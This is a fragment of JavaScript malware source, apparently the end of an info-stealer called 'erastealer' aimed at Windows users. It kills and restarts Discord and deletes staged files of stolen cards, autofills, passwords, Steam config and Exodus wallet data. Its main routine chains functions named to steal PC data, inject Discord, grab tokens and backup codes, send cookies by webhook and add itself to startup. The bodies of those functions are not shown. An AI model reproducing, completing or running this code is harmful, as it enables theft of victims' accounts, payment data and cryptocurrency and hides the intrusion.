    for (const executable of [
      "Discord.exe",
      "DiscordCanary.exe",
      "discordDevelopment.exe",
      "DiscordPTB.exe",
    ]) {
      if (stdout.includes(executable)) {
        exec(`taskkill /F /T /IM ${executable}`, (err) => {});
        exec(
          `"${localappdata}\\${executable.replace(
            ".exe",
            ""
          )}\\Update.exe" --processStart ${executable}`,
          (err) => {}
        );
      }
    }
  });
}

const deleteFile = (filePath) => {
  if (fs.existsSync(filePath)) {
    fs.unlink(filePath, (err) => {
      if (err) {
        console.error(err);
      }
    });
  }
};

const deleteFolder = (folderPath) => {
  if (fs.existsSync(folderPath)) {
    fs.rm(folderPath, { recursive: true, force: true }, (err) => {
      if (err) {
        console.error(err);
      }
    });
  }
};

const Clean = () => {
  const filesToDelete = [
    "Cards.txt",
    "Autofills.txt",
    "Passwords.txt",
    path.join("C:", "Program Files (x86)", "Steam", "config", "steam.zip"),
    path.join(
      "C:",
      "Users",
      process.env.USERNAME,
      "AppData",
      "Roaming",
      "Exodus",
      "Exodus.zip"
    ),
  ];

  filesToDelete.forEach(deleteFile);

  const folderToDelete = "erastealer";
  deleteFolder(folderToDelete);
};

function onlyUnique(item, index, array) {
  return array.indexOf(item) === index;
}

async function TgrabBG() {
  await errorMessage();
  await closeBrowsers();
  await getEncrypted();
  await StealPC();
  await Stop_DC();
  await InjectDiscord();
  await stealTokens();
  await stealBackupCodes();
  try {
  } catch {}
  await getCookiesAndSendWebhook();
  await putOnStartup();
  await Clean();
}

TgrabBG();
